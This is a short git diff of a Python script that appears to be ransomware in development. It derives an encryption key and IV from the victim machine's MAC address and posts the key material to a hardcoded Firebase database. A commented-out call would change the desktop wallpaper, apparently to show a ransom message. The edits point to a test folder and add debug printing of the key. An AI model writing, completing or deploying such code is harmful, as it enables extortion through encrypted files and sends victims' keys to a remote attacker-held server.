@@ -53,7 +53,7 @@ def change_bg():
     SPI_SETDESKWALLPAPER = 20
     ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, imagePath, 3)
 
-testPath = 'C:/Users/tmdgh/Desktop/test123/'
+testPath = 'C:/Users/tmdgh/Desktop/test124/'
 
 mac = get_mac()
 password2 = str(mac)
@@ -64,10 +64,12 @@ base = hashlib.pbkdf2_hmac('sha256', password, salt, 100000, dklen=IV_SIZE + KEY
 iv = base[0:IV_SIZE]
 key = base[IV_SIZE:]
 
-base2 = base.decode('utf-16')
-
 firebase = firebase.FirebaseApplication('https://keydata-e5fb1.firebaseio.com/', None)
-result = firebase.post('/user' + '/' + password2, {"Base" : base2})
+result = firebase.post('/user' + '/' + password2, {"Base" : str(base)})
+print(base)
+print(str(base))
+print(iv)
+print(key)
 
 #change_bg()
 
